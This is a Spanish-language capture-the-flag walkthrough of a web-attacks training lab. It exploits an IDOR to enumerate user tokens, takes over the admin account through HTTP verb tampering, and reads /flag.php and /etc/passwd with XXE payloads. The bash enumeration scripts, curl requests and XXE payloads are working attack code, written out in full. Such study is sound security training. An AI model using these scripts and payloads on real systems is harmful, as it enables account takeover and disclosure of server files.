
# Ataques Web - Skills Assesment

## <mark style="color:purple;">Escenario</mark>

Estamos realizando una prueba de penetración de aplicaciones web para una empresa de desarrollo de software y nos encargan que probemos la última versión de su aplicación web de redes sociales. Intenta utilizar las distintas técnicas que aprendiste en este módulo para identificar y explotar las múltiples vulnerabilidades que encuentres en la aplicación web.

Intenta aumentar tus privilegios y explotar diferentes vulnerabilidades para leer la flag en `/flag.php`.

```
Objetivo: 94.237.63.109:42403

User "htb-student"
Password "Academy_student!"
```

<figure><img src="/files/BALaP72QmjFYDA0GInGO" alt=""><figcaption></figcaption></figure>

Nos logueamos y accedemos a la aplicación interna:

<figure><img src="/files/2Mp97JlXwtxg4ZAe1sDf" alt=""><figcaption></figcaption></figure>

## Identificación de vulnerabilidad

Después de probar todos los links, la única funcionalidad de esta herramienta es la de cambio de contraseña:

<figure><img src="/files/B6fhkYtZWrW5qRSiDG0h" alt=""><figcaption></figcaption></figure>

Vamos a capturar esta petición con BurpSuite para ver si encontramos algo interesante:

<figure><img src="/files/Ose8I1GlRGjfZuR89SDo" alt=""><figcaption></figcaption></figure>

El endpoint `GET /api.php/token/74` parece ser una API que toma un identificador de token (`74`) como parámetro. La combinación de esta solicitud con la referencia a una sesión activa (mediante la cookie `PHPSESSID` y el identificador de usuario `uid=74`) abre oportunidades para técnicas comunes de hacking web.

Al hacer un forward de nuevo vemos que nos devuelve lo siguiente, que podríamos usar para cambiar la contraseña a un usuario administrador si sabemos su token:

<figure><img src="/files/mor0CgengNyIeEjjjjfA" alt=""><figcaption></figcaption></figure>

## Reconocimiento del endpoint

```bash
curl -X GET "http://94.237.59.180:58245/api.php/token/74"

{"token":"e51a8a14-17ac-11ec-8e67-a3c050fe0c26"}%  
```

Al cambiar el ID del token a `75`, obtenemos un nuevo token: `e51a8a3c-17ac-11ec-8e68-7fe51c0c175e`. Esto confirma que el endpoint **es vulnerable a IDOR (Insecure Direct Object Reference)**, ya que permite acceder a datos de otros usuarios o recursos cambiando un parámetro en la URL.

```bash
curl -X GET "http://94.237.59.180:58245/api.php/token/75"

{"token":"e51a8a3c-17ac-11ec-8e68-7fe51c0c175e"}%  
```

#### **¿Qué significa esto?**

* Podemos enumerar los tokens de diferentes usuarios modificando el ID en la solicitud.
* Si los tokens son sensibles (por ejemplo, para autenticación o acceso a recursos privados), esta vulnerabilidad puede escalar a una violación crítica.

## Enumeración de IDS

Vamos a crear un script en bash para automatizar el proceso de obtención de los IDS de los usuarios de la web y exportarlos a un archivo `tokens.txt`:

{% code title="enum.sh" %}

```bash
#!/bin/bash

# Archivo de salida
output_file="tokens.txt"

# Limpiar el archivo si existe
> "$output_file"

# Enumerar y guardar los tokens
for i in $(seq 1 100); do
  # Realizar la solicitud y extraer el token
  response=$(curl -s "http://94.237.59.180:58245/api.php/token/$i")
  token=$(echo "$response" | grep -oP '(?<="token":")[^"]+')

  # Mostrar el ID y el token en la terminal
  if [[ -n "$token" ]]; then
    echo "ID $i -> Token: $token"
    # Guardar solo el token en el archivo
    echo "$token" >> "$output_file"
  else
    echo "ID $i -> No se encontró token."
  fi
done

echo "Tokens guardados en $output_file."
```

{% endcode %}

Ejecutamos el script de la siguiente manera:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ sudo apt-get install jq
</strong>
afsh4ck@kali$ bash enum.sh           
ID 1 -> Token: e51a7c5e-17ac-11ec-8e1e-2f59f27bf33c
ID 2 -> Token: e51a7dc6-17ac-11ec-8e1f-df8a04f4691d
ID 3 -> Token: e51a7df8-17ac-11ec-8e20-37f52352c5ab
ID 4 -> Token: e51a7e20-17ac-11ec-8e21-eb442066c04d
ID 5 -> Token: e51a7e48-17ac-11ec-8e22-af3c03bc0d85
ID 6 -> Token: e51a7e70-17ac-11ec-8e23-ff853a7a4767
ID 7 -> Token: e51a7ede-17ac-11ec-8e24-d762f0e7e4eb
ID 8 -> Token: e51a7f06-17ac-11ec-8e25-d30db175b4a8
ID 9 -> Token: e51a7f2e-17ac-11ec-8e26-c320c60b942f
ID 10 -> Token: e51a7f56-17ac-11ec-8e27-2b4b9df74ed7
ID 11 -> Token: e51a7f88-17ac-11ec-8e28-bb050dc48221
ID 12 -> Token: e51a7fa6-17ac-11ec-8e29-b3d96ffb5b98
ID 13 -> Token: e51a7fce-17ac-11ec-8e2a-7b0cc9e17056
ID 14 -> Token: e51a8000-17ac-11ec-8e2b-175374b5359d
ID 15 -> Token: e51a8028-17ac-11ec-8e2c-0798288d48f2
&#x3C;-----SNIP----->
ID 98 -> Token: e51a8e56-17ac-11ec-8e7f-abd9fb600ff6
ID 99 -> Token: e51a8e7e-17ac-11ec-8e80-ab44f6066bfb
ID 100 -> Token: e51a8ea6-17ac-11ec-8e81-e7ed2e0a2951
Tokens guardados en tokens.txt.
</code></pre>

## Enumeración de usuarios

En la página de profile.php nos encontramos el siguiente script, que confirma la presencia de un json con los nombres, uids y empresa:

```html
<script>
        $(document).ready(function() {
            fetch(`/api.php/user/${$.cookie("uid")}`, {
                method: 'GET'
            }).then(function(response) {
                return response.json();
            }).then(function(json) {
                $("#full_name").html(json['full_name']);
                $("#company").html(json['company']);
            });
        });
    </script>
```

Ahora que tenemos todos los tokens, vamos a extraer los nombres de los usuarios con el siguiente script, para ver si encontramos algún usuario administrador:

{% code title="enum\_users.sh" %}

```bash
#!/bin/bash

# Configuración
BASE_URL="http://94.237.59.180:58245"
SESSION_ID="5jbl6dkcuuuluug4cp3uruv54m"
LOG_FILE="employee_info.txt"

# Crear o limpiar el archivo de log
echo "== Información de empleados ==" > "$LOG_FILE"

# Iterar por UIDs (asumiendo que los UIDs comienzan en 1 y suben secuencialmente)
for uid in {1..100}; do
  # Hacer la consulta al API
  user_info=$(curl -s -X GET "$BASE_URL/api.php/user/$uid" \
    -b "PHPSESSID=$SESSION_ID; uid=$uid")

  # Extraer el username, full_name y company usando `jq`
  username=$(echo "$user_info" | jq -r '.username')
  full_name=$(echo "$user_info" | jq -r '.full_name')
  company=$(echo "$user_info" | jq -r '.company')

  # Verificar si la información está disponible
  if [[ "$username" != "null" && "$full_name" != "null" && "$company" != "null" ]]; then
    echo "UID: $uid - Username: $username - Nombre: $full_name - Empresa: $company" | tee -a "$LOG_FILE"
  else
    echo "UID: $uid - No encontrado o datos incompletos." | tee -a "$LOG_FILE"
  fi
done

echo "Consulta completada. La información de los empleados está guardada en $LOG_FILE."
```

{% endcode %}

```shell-session
afsh4ck@kali$ bash enum_users.sh
UID: 1 - Username: s.applewhite - Nombre: Samanta Applewhite - Empresa: Daniel Inc
UID: 2 - Username: a.sumner - Nombre: Ari Sumner - Empresa: Friesen Group
UID: 3 - Username: j.oshaughnessy - Nombre: Jeevan Oshaughnessy - Empresa: Jaskolski - Lang
UID: 4 - Username: r.trainor - Nombre: Riggs Trainor - Empresa: Beer, Daugherty and Lang
UID: 5 - Username: j.bigelow - Nombre: Jakari Bigelow - Empresa: Ritchie - Hettinger
UID: 6 - Username: k.windsor - Nombre: Kahlan Windsor - Empresa: Rutherford LLC
UID: 7 - Username: w.amador - Nombre: Whitley Amador - Empresa: Howell and Sons
UID: 8 - Username: k.parrett - Nombre: Kristie Parrett - Empresa: Raynor Inc
UID: 9 - Username: g.fetter - Nombre: Guiliana Fetter - Empresa: Mann - Doyle
UID: 10 - Username: h.chaudhry - Nombre: Huxton Chaudhry - Empresa: Volkman - Satterfield
<----SNIP---->
```

Este script nos genera un archivo de log `employee_info.txt`, y aplicando un filtro con grep encontramos un posible usuario administrador:

```shell-session
afsh4ck@kali$ cat employee_info.txt | grep Admin
UID: 52 - Username: a.corrales - Nombre: Amor Corrales - Empresa: Administrator
```

Si solamente querríamos encontrar un usuario admin lo podríamos hacer mucho más simple con este script:

```bash
for i in {1..1000}; do curl -s http://94.237.63.109:42403/api.php/user/$i | grep -iE 'admin'; done

{"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}
```

Ya tenemos los datos completos del usuario administrador:

<pre><code>UID: 52
<strong>Username: a.corrales
</strong>Nombre: Amor Corrales
Empresa: Administrator
Token: e51a85fa-17ac-11ec-8e51-e78234eb7b0c
</code></pre>

## Prueba de cambio de contraseña

Vamos a probar a cambiar la contraseña de nuestro usuario por defecto con `UID 74`:

```bash
curl http://94.237.63.109:42403/reset.php -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=voemqq47duv395pvn3921qdv9q; uid=74' -d 'uid=74&token=e51a8a14-17ac-11ec-8e67-a3c050fe0c26&password=1234'
Password changed successfully
```

Vemos que funciona.

## Cambio de contraseña del admin

Vamos a usar " **Verb Tampering"** para eludir los controles de seguridad, y vamos a añadir su token:

```bash
curl 'http://94.237.63.109:42403/reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=1234' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=voemqq47duv395pvn3921qdv9q; uid=74'
Password changed successfully
```

Parece que ha funcionado. Vamos a probar a loguearnos con su nombre de usuario `a.corrales` y la nueva contraseña:

<figure><img src="/files/9xGUNKmLaZAaKHDpyzLt" alt=""><figcaption></figcaption></figure>

Bingo! Conseguimos acceder como el usuario administrador y vemos que tiene una nueva funcionalidad `Add Event`:

<figure><img src="/files/DBdMFnv4CPiyghI6QXB9" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/QtuZlNnplK8UjLnymOCU" alt=""><figcaption></figcaption></figure>

Vamos a capturar esta petición con BurpSuite para ver si obtenemos algo interesante:

<figure><img src="/files/zNW5wdQrDcxFFlNo99x0" alt=""><figcaption></figcaption></figure>

Tenemos un posible XXE. Viendo el código fuente encontramos un script que crea un nuevo archivo **XML** y lo envía en una solicitud **POST** al endpoint `/addEvent.php`:

```html
<script>
        function XMLFunction() {
            var xml = `
            <root>
            <name>${$('#name').val()}</name>
            <details>${$('#details').val()}</details>
            <date>${$('#date').val()}</date>
            </root>
            `;

            fetch(`addEvent.php`, {
                method: 'POST',
                body: xml,
            }).then(function(response) {
                return response.text();
            }).then(function(res) {
                $('#error_string').html(res);
            });
        };
    </script>
```

Al enviar la petición al Repeater y ver la respuesta vemos que el valor del input `name` se nos muestra en la página. Para imprimir el contenido de un archivo externo en la página, debemos observar qué elementos se muestran, de modo que sepamos en qué elementos inyectar.

<figure><img src="/files/K0kolqdlg3rXj9y8VJfR" alt=""><figcaption></figcaption></figure>

## Leer el contenido de flag.php

Vamos a utilizar el siguiente payload para codificar en base64 el contenido de `flag.php`:

```xml
<?xml version="1.0"?>
<!DOCTYPE name [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
]>
            <root>
            <name>&company;</name>
            <details>Test</details>
            <date>2024-11-25</date>
            </root>
```

Parece que funciona y nos devuelve el contenido de `flag.php` codificado en base64:

<figure><img src="/files/Hd4N0VdbdHfF2EmJfmuP" alt=""><figcaption></figcaption></figure>

Lo enviamos a `Burp Decoder` y al decodificarlo en base64 obtenemos la flag en plano:

<figure><img src="/files/9ZDDEOqBR1wAzEwx9QRd" alt=""><figcaption></figcaption></figure>

## Local File Disclosure

De igual manera podríamos usar un payload similar para obtener cualquier archivo del sistema (como el `/etc/passwd`), quedando completamente comprometido:

```xml
<?xml version="1.0"?>
<!DOCTYPE name [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
            <root>
            <name>&company;</name>
            <details>Test</details>
            <date>2024-11-25</date>
            </root>
```

<figure><img src="/files/6uqfJkGr2kbHB0LHjGeZ" alt=""><figcaption></figcaption></figure>
